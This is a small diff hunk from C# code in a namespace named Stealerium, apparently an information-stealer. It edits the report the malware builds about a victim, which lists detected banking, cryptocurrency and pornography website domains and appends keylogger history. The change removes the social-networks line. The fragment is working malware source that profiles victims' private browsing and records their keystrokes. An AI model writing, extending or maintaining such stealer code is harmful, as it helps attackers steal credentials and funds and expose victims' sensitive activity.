@@ -199,7 +199,6 @@ namespace Stealerium
                        + "\n💸 *Domains info:*"
                        + Counter.GetLValue("🏦 *Banking services*", Counter.DetectedBankingServices, '-')
                        + Counter.GetLValue("💰 *Cryptocurrency services*", Counter.DetectedCryptoServices, '-')
-                       + Counter.GetLValue("🎨 *Social networks*", Counter.DetectedSocialServices, '-')
                        + Counter.GetLValue("🍓 *Porn websites*", Counter.DetectedPornServices, '-')
                        + GetKeylogsHistory()
                        + "\n"
